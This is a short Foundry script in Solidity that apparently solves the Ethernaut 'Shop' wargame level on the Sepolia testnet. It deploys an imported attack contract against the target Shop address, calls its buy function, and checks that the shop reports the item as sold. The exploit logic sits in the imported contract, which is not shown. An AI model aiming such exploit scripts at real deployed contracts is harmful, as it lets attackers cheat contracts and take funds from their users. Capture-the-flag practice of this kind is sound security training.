// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Cracked21_Shop.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked21_ShopScript --broadcast
contract Cracked21_ShopScript is Script {
    address ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("Shop_address"));
    }

    function run() public {
        vm.startBroadcast();
        Cracked21_Shop attack = new Cracked21_Shop(ethernaut_contracts);
        attack.buy();
        require(IShop(ethernaut_contracts).isSold(), "isSold is false");
        vm.stopBroadcast();
    }
}
